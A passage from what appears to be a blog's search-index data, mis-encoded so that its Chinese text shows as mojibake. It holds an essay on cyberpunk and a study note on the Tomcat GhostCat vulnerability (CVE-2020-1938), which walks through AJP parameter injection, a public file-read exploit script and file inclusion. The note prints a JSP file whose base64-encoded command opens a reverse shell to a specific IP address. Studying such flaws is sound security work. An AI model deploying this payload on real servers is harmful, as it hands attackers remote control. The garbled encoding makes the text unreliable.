¹æœ¬æ²¡æœ‰äººä»¬å¦‚ä»Šçœ‹åˆ°çš„è™šæ‹Ÿä¸–ç•Œçš„å“ªæ€•ä¸€ä¸å½±å­,æˆ‘æ‰€èƒ½æƒ³åˆ°çš„,æ˜¯è¿™äº›ç§‘å¹»ä½œå®¶ä»¬å‡­å€Ÿè‡ªèº«å°‘å¾—å¯æ€œçš„ç§‘æŠ€æ°´å¹³å’Œå¯¹äººæ€§çš„å……åˆ†äº†è§£æ‰€åšå‡ºçš„çŒœæµ‹å’Œè‡†æƒ³,æˆ–è®¸ä»–ä»¬åˆ›ä½œçš„åŠ¨æœºä¸­,æ ¹æœ¬ä¸åŒ…æ‹¬ä¸€ä¸ä¸¥è‚ƒæ‰¹åˆ¤çš„æ€è€ƒ,è€Œåªæ˜¯ä¸ºäº†åšäººçœ¼çƒæ¥å¤šèµšç‚¹ç¨¿è´¹ç½¢äº†,ä½†æ€»ä¹‹,ä»–ä»¬çŒœä¸­äº†,å¹¶ä¸”çŒœå¾—æ›´åŠ è¶…å‰.æˆ–è®¸ç§‘æŠ€çš„å‘å±•å²,å°±æ˜¯ä¸€å‰¯è‚–åƒç”»,ç”»çš„ä¸»é¢˜å«åšäººæ€§.\n","permalink":"https://dragonbox.top/posts/gossip-cyberpunk/","summary":"\u003cp\u003eç§‘æŠ€çš„å‘å±•å¹¶ä¸ä»£è¡¨å†…å·çš„é¿å…,ç›¸å,ä¸€å‘³è¿½æ±‚åœ¨è™šæ‹Ÿä¸–ç•Œä¸­å¼€ç–†æ‹“åœŸ,å¿½è§†å®‡å®™å’Œæ·±æµ·çš„æ¢ç´¢å¼€å‘æ­£æ˜¯äººç±»ç¤¾ä¼šå†…å·åŒ–çš„é›†ä¸­åæ˜ ,æ­¤å¤„çš„å†…å·,å’Œé€šå¸¸çš„å†…å·å®šä¹‰ç›¸åŒ,å³\u0026quot;ä¸€ç±»æ–‡åŒ–æ¨¡å¼è¾¾åˆ°äº†æŸç§æœ€ç»ˆçš„å½¢æ€ä»¥å,æ—¢æ²¡æœ‰åŠæ³•ç¨³å®šä¸‹æ¥,ä¹Ÿæ²¡æœ‰åŠæ³•è½¬å˜ä¸ºæ–°çš„å½¢æ€.è€Œåªèƒ½ä¸æ–­åœ°åœ¨å†…éƒ¨å˜å¾—æ›´åŠ å¤æ‚çš„ç°è±¡\u0026quot;,åªä¸è¿‡å¯¹è±¡ä»æ™®é€šçš„å°ç¾¤ä½“å˜æˆäº†å…¨ä½“äººç±»,ç¤¾ä¼šçŸ›ç›¾çš„é¢‘ç¹çˆ†å‘è®©äººç±»å€¾å‘äºå°†è‡ªå·±çš„çµä¸è‚‰å¥‰çŒ®ç»™è™šæ‹Ÿçš„ç¥,è¿™ç§å¥‰çŒ®çš„çƒ­è¯šèƒŒåå……æ–¥ç€å¯¹å†°å†·ç°å®çš„æ— åŠ›æ„Ÿå’Œé€ƒé¿,å³ä¾¿è¿™ç§è™šæ‹Ÿæ˜¯äººç±»è‡ªå·±åˆ›é€ å‡ºæ¥çš„,ä»–ä»¬ä¾æ—§é€‰æ‹©å¿½è§†ç”šè‡³å¿˜å´è¿™ç§è‡ªçŸ¥,é€‰æ‹©è¢«å¥´å½¹,è†œæ‹œå’Œç»ä»°.\u003c/p\u003e\n\u003cp\u003eå¦å¤–ä¸€æ–¹é¢,æ­£å¦‚æ´›å¤«å…‹æ‹‰å¤«ç‰¹æ‰€è¯´çš„\u0026quot;äººç±»æœ€å¤è€åˆæœ€å¼ºçƒˆçš„æƒ…ç»ª,å°±æ˜¯ææƒ§;è€Œæœ€å¤è€åˆæœ€å¼ºçƒˆçš„ææƒ§,æ˜¯å¯¹æœªçŸ¥çš„ææƒ§\u0026quot;,åœ¨åˆ»å½•åœ¨åŸºå› ä¸­çš„äººæ€§çš„é©±ä½¿ä¸‹,äººç±»åœ¨æ€»ä½“å±‚é¢ä¸Šå¯¹æœªçŸ¥çš„æ·±æµ·å’Œå¤ªç©ºæ˜¯ææƒ§çš„,å¯æ˜¯,è¦è®©äººç±»æ¥å—è‡ªå·±ç¤¾ä¼šå‘å±•åœæ»ä¸å‰çš„äº‹å®,åˆæ˜¯å¯è€»ä¸”æ— æ³•æ¥å—çš„.åœ¨è¿™ç§èƒŒæ™¯ä¸‹,è™šæ‹Ÿä¸–ç•Œçš„æ‰©å¼ ä»å¦ä¸€ä¸ªè§’åº¦ä¸ºå…¨ä½“äººç±»æä¾›äº†ä¸€ä¸ª\u0026quot;å‘å±•\u0026quot;çš„å¹»è±¡,ä½¿å¾—äººç±»å¯ä»¥å°†è’™è”½åŒçœ¼,é€ƒè„±ç”Ÿå­˜å›°å¢ƒ,å°†æ³¨æ„åŠ›é›†ä¸­åœ¨å·²æœ‰äº‹ç‰©çš„\u0026quot;å‘å±•\u0026quot;ä¸Š,å³ä¾¿æ˜¯å†…å·å¼çš„å‘å±•.\u003c/p\u003e\n\u003cp\u003eä»ç†æ€§çš„è§’åº¦æ¥è¯´,äººç±»æ–‡æ˜è¦æƒ³é•¿å­˜ä¸ä¼‘,å¿…é¡»è¦å°†è§¦è§’æåŠ›æ‰©å¼ åˆ°å¤ªç©ºå’Œæµ·æ´‹å½“ä¸­,ç„¶è€Œäººç±»æ€»ä½“ä¸Šå‘ˆç°çš„æ˜¯ä¸€ç§éç†æ€§çš„æ„è¯†å½¢æ€,è¿™å¹¶ä¸æ–°å¥‡,åœ¨ä¸Šå¸å·²æ­»çš„å¹´ä»£é‡Œ,äººç±»ç›¸ä¿¡çš„ä¸å†æ˜¯ç¥æ˜è€Œæ˜¯ç§‘æŠ€å’Œèµ„æœ¬,è€Œç§‘æŠ€ä¸ºèµ„æœ¬æ‰€æŒæ§,æ‰€ä»¥èµ„æœ¬çš„ä¿¡ä»°ä¾¿æ˜¯äººç±»çš„ä¿¡ä»°,ä¹çœ‹ä¹‹ä¸‹,èµ„æœ¬ä»£è¡¨ç€è´ªå©ªå’Œé€åˆ©,å¹¶ä¸”å…·å¤‡ä¸€å®šç¨‹åº¦ä¸Šçš„ç†æ€§,ä½†å¯æƒœçš„æ˜¯,æ­£æ˜¯è¿™ç§ä¿¡ä»°å°†è™šæ‹Ÿä¸–ç•Œæ§ä¸Šç¥å›å¹¶åŠ å‰§äº†ç¤¾ä¼šçš„å†…å·åŒ–,è€Œè¿™ç§æƒ…å†µå¾ˆéš¾å‘ç”Ÿæ”¹å˜,ç†ç”±å¦‚ä¸‹:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eèµ„æœ¬å¹¶ä¸å…·å¤‡å¼•é¢†äººç±»ç¤¾ä¼šå‘å¥½å‘å±•çš„åŠ¨æœº,èµ„æœ¬è¡ŒåŠ¨çš„å”¯ä¸€åŠ¨æœºæ˜¯ä¸ºè‡ªèº«é€åˆ©\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eèµ„æœ¬ç†æ€§çš„ä¸»ä½“åœ¨\u0026quot;è‡ªå·±çš„å¯¿å‘½æ˜¯æœ‰é™çš„\u0026quot;è¿™æ ·ä¸€ä¸ªå‰æä¸‹,ä¼šè‡ªå‘é€‰æ‹©åœ¨\u0026quot;å½“ä¸‹\u0026quot;æ—¶é—´ç‚¹è·åˆ©æœ€å¤§çš„å‘å±•æ–¹å‘\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eå½“èµ„æœ¬åœ¨ä¸€ä¸ªé¢†åŸŸä¸­èƒ½æˆ–å³å°†è·å–è¶³å¤Ÿå¤šåˆ©æ¶¦,æˆ–è€…å‘ç°åˆ‡æ¢åˆ«çš„é¢†åŸŸæ‰€ä»˜å‡ºçš„ä»£ä»·è¿œå¤§äºè‡ªå·±æ‰€å¤±å»çš„æ—¶å€™,å®ƒå°†è°ƒç”¨èˆ†è®ºå¸å¼•äººç±»çš„æ³¨æ„åŠ›ä»¥æœŸæ›´å¤§çš„åˆ©æ¶¦ç©ºé—´\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eäººç±»æ˜¯ç›²ä»ä¸”æ„šæ˜§çš„,å°¤å…¶æ˜¯åœ¨è¢«æ¶ˆè´¹ç¤¾ä¼šé˜‰å‰²æ‰¹åˆ¤èƒ½åŠ›ååŸºæœ¬ä¸Šå·²ç»ä¸§å¤±äº†çœŸæ­£çš„è‡ªç”±æ„å¿—,æˆä¸ºèµ„æœ¬çš„ç‰µçº¿æœ¨å¶.\u003c/p\u003e\n\u003cp\u003eä¸€ä¸ªé¢å¤–çš„å‘ç°æ˜¯,å¦‚æœå°†ä¸Šè¿°ä¸‰ä¸ªç†ç”±ä½œä¸ºè¯„åˆ¤èµ„æœ¬èƒ½åŠ›çš„æ ‡å‡†,å°±ä¼šå‘ç°è…¾è®¯é˜¿é‡Œå·´å·´ç­‰ä¸é ç§‘æŠ€é©±åŠ¨çš„å…¬å¸æ‰æ˜¯èµ„æœ¬æ„ä¹‰ä¸Šèƒ½åŠ›æœ€å¼ºçš„å…¬å¸,æˆ‘æ‹…å¿ƒè¿™ç§å†…å·å¼çš„å´›èµ·ä¼šæé†’å…¶ä»–èµ„æœ¬,æœ€å¤§åŒ–çš„åˆ©æ¶¦å®Œå…¨ä¸éœ€è¦ç§‘æŠ€åˆ›æ–°,åªéœ€è¦é \u0026quot;å†…å·\u0026quot;å°±å¯ä»¥äº†.æˆ–è®¸,ä»–ä»¬å·²ç»æ„è¯†åˆ°äº†?\u003c/p\u003e\n\u003cp\u003eå…¶å®å¾ˆä¹…ä»¥å‰å°±æœ‰äººé¢„æµ‹åˆ°äº†å¦‚ä»Šçš„ç°çŠ¶,é‚£å°±æ˜¯èµ›ä¼¯æœ‹å…‹,å®ƒæƒ³å‘Šè¯‰äººä»¬,ç§‘æŠ€çš„ç•¸å½¢å‘å±•ä¸èƒ½è§£å†³è€Œä¼šåŠ å‰§ç¤¾ä¼šçŸ›ç›¾å’Œäººç±»çš„ç„¦è™‘,å¯é—æ†¾çš„æ˜¯,åœ¨èµ„æœ¬çš„æ“çºµä¸‹,è¿™ç§ç•¸å½¢çš„ç§‘æŠ€è¢«ç¹å¤ç‚«ç›®çš„å…‰å½±åŒ…è£…æˆäº†ä¸€ç§ç¾å­¦è±¡å¾,è¿™ç§äººç±»çš„ç„¦è™‘è¢«åˆ»æ„æ·¡åŒ–ç”šè‡³æŠ¹å»,è½¬è€Œé‡æ–°å˜æˆä¸€ç§å•†å“,ä¸€ç§æ— è®ºæ˜¯åœ¨å•†ä¸šæ„ä¹‰è¿˜æ˜¯ç²¾ç¥æ„ä¹‰ä¸Šå¯¹èµ„æœ¬åŠ›é‡æ›´åŠ æœ‰åˆ©çš„å•†å“\u0026ndash;æ—¢è°‹å–äº†åˆ©æ¶¦,åˆæ‰­æ›²äº†å¯¹æŠ—è™šæ‹Ÿçš„æ–‡å­¦,è¿™å‡º\u0026quot;åŒ–æ•Œä¸ºå‹\u0026quot;å®åœ¨é«˜æ˜è‡³æ.\u003c/p\u003e\n\u003cp\u003eèµ›åšæœ‹å…‹æŒ‡å‡ºäº†ç§‘æŠ€ç•¸å½¢å‘å±•æ‰€äº§ç”Ÿçš„é—®é¢˜,è­¦å‘Šäººä»¬è¿™æ ·åšçš„åæœ,ä½†æ˜¯å¾ˆå¯æƒœ,æˆ‘ä»¬å·²ç»åœä¸ä¸‹æ¥äº†,çœ‹èµ·æ¥,æˆ‘ä»¬åŠ¿å¿…è¿ˆå…¥èµ›ä¼¯æœ‹å…‹å¼çš„æœªæ¥ç¤¾ä¼šä¸­,æ­¥å±¥åšå®š,çƒ­åˆ‡çœŸè¯š.è€Œåˆ°äº†é‚£ä¸ªæ—¶å€™,æˆ–è€…åœ¨é‚£ä¹‹å‰,ä¹Ÿè®¸æ›´æœ‰ä»·å€¼çš„é—®é¢˜æ˜¯:æˆ‘ä»¬å¦‚ä½•èµ°å‡ºèµ›ä¼¯æœ‹å…‹?\u003c/p\u003e\n\u003cp\u003eè¯è¯´å›æ¥,åœ¨èµ›åšæœ‹å…‹è¢«æå‡ºçš„é‚£ä¸ªå¹´ä»£,æ ¹æœ¬æ²¡æœ‰äººä»¬å¦‚ä»Šçœ‹åˆ°çš„è™šæ‹Ÿä¸–ç•Œçš„å“ªæ€•ä¸€ä¸å½±å­,æˆ‘æ‰€èƒ½æƒ³åˆ°çš„,æ˜¯è¿™äº›ç§‘å¹»ä½œå®¶ä»¬å‡­å€Ÿè‡ªèº«å°‘å¾—å¯æ€œçš„ç§‘æŠ€æ°´å¹³å’Œå¯¹äººæ€§çš„å……åˆ†äº†è§£æ‰€åšå‡ºçš„çŒœæµ‹å’Œè‡†æƒ³,æˆ–è®¸ä»–ä»¬åˆ›ä½œçš„åŠ¨æœºä¸­,æ ¹æœ¬ä¸åŒ…æ‹¬ä¸€ä¸ä¸¥è‚ƒæ‰¹åˆ¤çš„æ€è€ƒ,è€Œåªæ˜¯ä¸ºäº†åšäººçœ¼çƒæ¥å¤šèµšç‚¹ç¨¿è´¹ç½¢äº†,ä½†æ€»ä¹‹,ä»–ä»¬çŒœä¸­äº†,å¹¶ä¸”çŒœå¾—æ›´åŠ è¶…å‰.æˆ–è®¸ç§‘æŠ€çš„å‘å±•å²,å°±æ˜¯ä¸€å‰¯è‚–åƒç”»,ç”»çš„ä¸»é¢˜å«åšäººæ€§.\u003c/p\u003e","title":"èµ›åšå†…å·"},{"content":" æœ¬æ–‡ä¸»è¦å‚è€ƒ https://blog.csdn.net/qq_31481187/article/details/105917392 å’Œ https://paper.seebug.org/1142/#_6 ï¼Œå¹¶æ— åŸåˆ›å†…å®¹ï¼Œä»…ä»…æ˜¯ä¸ªäººå­¦ä¹ ç¬”è®°ã€‚\næ¼æ´åŸç† å®˜ç½‘å¯¹AJPåè®®çš„ä»‹ç»å¦‚ä¸‹\nThe AJP Connector element represents a Connector component that communicates with a web connector via the AJP protocol. This is used for cases where you wish to invisibly integrate Tomcat into an existing (or new) Apache installation, and you want Apache to handle the static content contained in the web application, and/or utilize Apache\u0026rsquo;s SSL processing.\nhttps://blog.hillpig.top/apache-tomcat-nginx/ ä¸­æåˆ°äº†AJPåè®®çš„ä½¿ç”¨åœºæ™¯ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ã€‚\nè¯¥æ¼æ´ä¸»è¦æ˜¯ç”±äºTomcat å¯¹ä»AJPåè®®ä¼ æ¥çš„æ•°æ®æ²¡æœ‰æ­£ç¡®è§£æï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ä»¥ä¸‹ä¸‰ä¸ªå‚æ•°\njavax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path åœ¨tomcatç›®å½•ä¸‹çš„conf/web.xmlä¸­ï¼Œè§„å®šäº†ä¸¤ç§servletï¼Œåˆ†åˆ«ç”¨äºå¤„ç†é»˜è®¤ç±»å‹çš„æ–‡ä»¶ï¼ˆæ¯”å¦‚é™æ€èµ„æºï¼‰å’ŒJSPç±»å‹çš„è·¯å¾„è¯·æ±‚ã€‚\n\u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.apache.catalina.servlets.DefaultServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;debug\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;0\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;listings\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;jsp\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.apache.jasper.servlet.JspServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;fork\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;xpoweredBy\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;load-on-startup\u0026gt;3\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; mapè§„åˆ™\n\u0026lt;!-- The mapping for the default servlet --\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;!-- The mappings for the JSP servlet --\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;jsp\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.jsp\u0026lt;/url-pattern\u0026gt; \u0026lt;url-pattern\u0026gt;*.jspx\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; ä¸¤ç§servletå¯¼è‡´äº†ä¸¤ä¸ªæ¼æ´ï¼šDefaultSevletå¯¼è‡´äº†æ–‡ä»¶è¯»å–ï¼ŒJspServletå¯¼è‡´äº†ä»£ç æ‰§è¡Œï¼Œåè€…æ˜¯ä»¥æ–‡ä»¶åŒ…å«çš„å½¢å¼æ‰§è¡Œçš„ï¼Œå› æ­¤è¦åˆ©ç”¨é¦–å…ˆéœ€è¦åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šä¸Šä¼ æ–‡ä»¶ã€‚é€šè¿‡æ§åˆ¶urlè®¿é—®è·¯å¾„ï¼Œå¯ä»¥é€‰æ‹©è§¦å‘è¿™ä¸¤ç§servletä¸­çš„ä»»æ„ä¸€ç§ã€‚\nç¯å¢ƒæ­å»º æœ¬æ–‡æ¼æ´è°ƒè¯•åœ¨arch linuxä¸‹è¿›è¡Œï¼Œå…¶ä»–ç³»ç»Ÿåœ¨ç¯å¢ƒå˜é‡è®¾ç½®ä¸Šæœ‰æ‰€å·®å¼‚ï¼Œè‡ªè¡Œè°ƒæ•´ã€‚\né¦–å…ˆéœ€è¦å®‰è£… java 8ï¼Œåœ¨arch linux ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯\nsudo pacman -S jdk8-openjdk å¦‚æœäº‹å…ˆå®‰è£…äº†å…¶ä»–ç‰ˆæœ¬çš„javaï¼Œåœ¨å®‰è£…jdk8ä¹‹åå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤åˆ‡æ¢é»˜è®¤javaç‰ˆæœ¬\nsudo archlinux-java set java-8-openjdk ç„¶åä¸‹è½½tomcat8å’Œæºç \nwget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/bin/apache-tomcat-8.5.30.zip wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/src/apache-tomcat-8.5.30-src.zip å°†ä¸¤ä¸ªéƒ½è§£å‹ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç”¨æ¥è¿è¡Œtomcatçš„ï¼Œç¬¬äºŒä¸ªæ˜¯ç”¨æ¥åœ¨IDEAé‡Œé¢è°ƒè¯•çš„ï¼Œè°ƒè¯•çš„åŸç†å’Œphpçš„remote debugç±»ä¼¼ã€‚è¿™é‡Œé€šè¿‡5005ç«¯å£æ¥è¿›è¡Œè°ƒè¯•é€šä¿¡\næ‰“å¼€ç¬¬ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œé¢çš„bin/catalina.shï¼ŒåŠ å…¥ä»¥ä¸‹ä»£ç \nexport JAVA_OPTS=\u0026#39;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005\u0026#39; ç„¶åè®¾ç½®ä»¥ä¸‹çš„ç¯å¢ƒå˜é‡ï¼Œè¿™é‡Œæˆ‘å°†ç¬¬ä¸€ä¸ªæ–‡ä»¶è§£å‹å‡ºæ¥çš„ä¸œè¥¿æ”¾åœ¨äº†/usr/local/tomcat/ä¸‹é¢ã€‚\n# for tomcat debug export JAVA_HOME=/usr/lib/jvm/java-8-openjdk export JRE_HOME=$JAVA_HOME/jre export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin export CATALINA_HOME=/usr/local/tomcat/apache-tomcat-8.5.30 export CLASSPATH=$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib:$CATALINA_HOME/lib export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin:$CATALINA_HOME/bin æ‰§è¡Œ\n./catalina.sh start è®¿é—®æµè§ˆå™¨8080ç«¯å£å¯ä»¥çœ‹åˆ°tomcaté»˜è®¤é¡µé¢è¯´æ˜æ­å»ºæˆåŠŸã€‚\nç„¶åç”¨IDEAæ‰“å¼€ç¬¬äºŒä¸ªæ–‡ä»¶å¤¹ä¸­çš„javaç›®å½•ã€‚æ·»åŠ é…ç½®\nä¸‹æ–­ç‚¹ï¼Œè¿è¡Œdebugï¼Œç„¶åè¿è¡Œexpè„šæœ¬ï¼Œå¼€å§‹è°ƒè¯•\npython2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 127.0.0.1 æ¼æ´è°ƒè¯• æ–‡ä»¶è¯»å–æ¼æ´ è¿™é‡Œä½¿ç”¨wiresharkæ¥æŠ“å–expå‘å‡ºçš„æµé‡ã€‚\nå¯ä»¥çœ‹åˆ°AJPåè®®è¯·æ±‚ä¸­åŒ…å«äº†ç»“å°¾çš„ä¸‰ä¸ªé”®å€¼å¯¹ï¼Œå¹¶ä¸”è¯·æ±‚çš„æ˜¯/asdfè·¯å¾„ï¼Œå› æ­¤å¤„ç†è¿™ä¸ªè¯·æ±‚çš„æ˜¯DefaultServletã€‚\nåœ¨org.apache.coyote.ajp.AjpProcessor#serviceä¸­çš„prepareRequestæ‰“ä¸‹æ–­ç‚¹ï¼Œè®©ç¨‹åºè¿è¡Œåˆ°æ­¤ï¼Œæ­¥è¿›ã€‚\nåœ¨prepareRequestå‡½æ•°é‡Œé¢çš„forå¾ªç¯ä¸­è·å–äº†å‡ ä¸ªç‰¹å®šçš„è¯·æ±‚å¤´ä¿¡æ¯ï¼Œç„¶ååˆ°è¿™é‡Œ\næ­¥è¿›\nè¿™é‡Œmbè¿˜æ˜¯Upgrade-Insecure-Requestsï¼Œå†æ­¥è¿›\nåˆ°è¿™é‡Œmbçš„å€¼æ²¡å˜ï¼Œç„¶åå†å¾€ä¸‹\nå˜æˆäº†æ”»å‡»çš„é…ç½®é¡¹ï¼Œçœ‹çœ‹setByteså‡½æ•°é‡Œé¢åšäº†ä»€ä¹ˆ\nçœ‹çœ‹bçš„å€¼\næ˜¯è¯·æ±‚ä½“ï¼Œç„¶åoffçš„å€¼æ˜¯255ï¼Œlençš„å€¼æ˜¯33ã€‚setByteså‡½æ•°ä¸­å¯¹å‡ ä¸ªå˜é‡è¿›è¡Œäº†è®¾ç½®ï¼Œè¿™é‡Œstartå’Œendä¸­é—´çš„é‚£æ®µå­—ç¬¦ä¸²å°±æ˜¯javax.servlet.include.request_uriã€‚\nç„¶åè¿”å›ï¼Œæ¥ä¸‹æ¥åŒæ ·çš„æ–¹æ³•è¯»å–äº†å€¼\nè®¾ç½®\nå…¶ä»–ä¸¤ä¸ªé…ç½®é¡¹éƒ½æ˜¯åŒæ ·çš„è¯»å–æ–¹å¼ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚åˆ°æ­¤ä½ç½®prepareRequest()å‡½æ•°åˆ†æå®Œæˆ\nå›åˆ°prepareRequestå‡½æ•°æ‰€åœ¨çš„ä½ç½®ï¼Œç»§ç»­å¾€ä¸‹\nå°†è¯·æ±‚äº¤ç»™äº†serviceå‡½æ•°ï¼Œæ­¥è¿›ï¼Œä¸€ç›´åˆ°è¿™é‡Œ\næ­¥è¿›ï¼Œç»§ç»­è°ƒå¯ä»¥çœ‹åˆ°wrapperé€‰æ‹©äº†DefaultServlet\nç»§ç»­ï¼Œä¸€ç›´åˆ°DefaultServlet#doGetæ–¹æ³•ã€‚\nrequestæºå¸¦ç€æ”»å‡»é…ç½®é¡¹è¿›å…¥äº†serveResourceä¸­ï¼Œæ­¥è¿›ï¼Œä¸€ç›´åˆ°getRelativePathå‡½æ•°ï¼Œå‘ç°è¿™é‡Œåœ¨å°è¯•è·å–requestè¯·æ±‚ä¸­çš„javax.servlet.include.request_uriã€‚\nè¿›å…¥ifåˆ¤æ–­ä¹‹ååˆç´§æ¥ç€è·å–äº†javax.servlet.include.path_info å’Œ javax.servlet.include.servlet_path ä¸¤ä¸ªå±æ€§ï¼Œç„¶ååœ¨ä¸‹é¢è¿›è¡Œäº†æ‹¼æ¥è¿”å›\nå›åˆ°DefaultServlet#serveResourceï¼Œ åœ¨è¿™é‡Œè·å–æ–‡ä»¶èµ„æº\næ­¥è¿›ï¼Œå‘ç°ä¼šåšä¸€ä¸ªpathçš„éªŒè¯\næ­¥è¿›validateï¼Œå‘ç°è¿™é‡Œè¿›è¡Œäº†ä¸€ä¸ªnormalizeæ“ä½œ\nè¿™ä¸¤ä¸ªwhileå¾ªç¯ä¸å…è®¸pathä¸­å‡ºç°./å’Œ../ï¼Œä¼šå°†å…¶æ›¿æ¢ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶è¯»å–æ¼æ´æ˜¯ä¸èƒ½ç©¿é€åˆ°ä¸Šå±‚ç›®å½•è¯»å–çš„ã€‚\nè¿”å›åˆ°StandarRoot#getResourceæ–¹æ³•ï¼Œæ­¥è¿›åˆ°cache.getResourceä¸­\nåœ¨è¿™é‡Œï¼Œè·å–åˆ°äº†å¯¹åº”webè·¯å¾„ä¸‹çš„æ–‡ä»¶å†…å®¹å¹¶æœ€ç»ˆè¿”å›ç»“æœï¼Œè‡³æ­¤æ–‡ä»¶è¯»å–æ¼æ´åˆ†æå®Œæ¯•ã€‚\næ–‡ä»¶åŒ…å«æ¼æ´ é¦–å…ˆåœ¨webappsä¸‹é¢å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œåç¼€åéšæ„\n\u0026lt;% java.io.InputStream in = Runtime.getRuntime().exec(\u0026#34;bash -c {echo,YmFzaCAtYyAnc2ggLWkgJj4vZGV2L3RjcC8zOS4xMDUuMTc2LjM3LzEyMzM0IDA+JjEn}|{base64,-d}|{bash,-i}\u0026#34;).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %\u0026gt; ç„¶åexpé‡Œé¢éœ€è¦ä¿®æ”¹è¿™éƒ¨åˆ†\nä¸º\nè¿™æ ·æ‰å¯ä»¥è®©è¯·æ±‚è¢«JspServletå¤„ç†ã€‚è¿™ä¹‹åè¿›å…¥org.apache.jasper.servlet.JspServletï¼Œç›´æ¥åœ¨serviceæ–¹æ³•ä¸­ä¸‹æ–­ç‚¹ã€‚è¿è¡Œexpå¼€å§‹è°ƒè¯•ï¼Œè·³è¿‡å‰é¢çš„prepareRequestç¯èŠ‚åï¼Œæ¥åˆ°è¿™é‡Œ\nè¿™é‡Œå’Œä¹‹å‰ä¸€æ ·ä¹Ÿè·å–äº†javax.servlet.include.path_infoç­‰å±æ€§ï¼Œç„¶åè¿›å…¥serviceJspFileæ–¹æ³•\nç”Ÿæˆäº†wrapperå¯¹è±¡ï¼Œç„¶åè°ƒç”¨äº†wrapper.serviceæ–¹æ³•ï¼Œç»§ç»­è°ƒè¯•ï¼Œçœ‹åˆ°JspServletWrapperçš„serviceæ–¹æ³•ä¸­è°ƒç”¨äº†getServlet()\nç»§ç»­å¾€ä¸‹å°±å¯ä»¥çœ‹åˆ°è¿™é‡Œäº†ï¼Œä»£ç æ‰§è¡ŒæˆåŠŸã€‚\næ€»ç»“ æ¶æ„é…ç½®é¡¹æ˜¯å¦‚ä½•è¢«è§£æçš„ï¼Œå…¶å®è¿˜æ˜¯ä¸æ˜¯å¾ˆæ¸…æ¥šã€‚å¦å¤–æœ‰å¿…è¦äº†è§£ä¸€ä¸‹servletçš„æ‰§è¡Œè¿‡ç¨‹äº†ã€‚\n","permalink":"https://dragonbox.top/posts/sec-ghostcat/","summary":"\u003cblockquote\u003e\n\u003cp\u003eæœ¬æ–‡ä¸»è¦å‚è€ƒ \u003ca href=\"https://blog.csdn.net/qq_31481187/article/details/105917392\"\u003ehttps://blog.csdn.net/qq_31481187/article/details/105917392\u003c/a\u003e å’Œ \u003ca href=\"https://paper.seebug.org/1142/#_6\"\u003ehttps://paper.seebug.org/1142/#_6\u003c/a\u003e ï¼Œå¹¶æ— åŸåˆ›å†…å®¹ï¼Œä»…ä»…æ˜¯ä¸ªäººå­¦ä¹ ç¬”è®°ã€‚\u003c/p\u003e\n\u003c/blockquote\u003e","title":"GhostCat(CVE-2020-1938)æ¼æ´å­¦ä¹ "},{"content":" æˆ‘ç»ˆäºæ›´æ–°åšå®¢äº†â€¦â€¦\næ¼æ´åŸç† 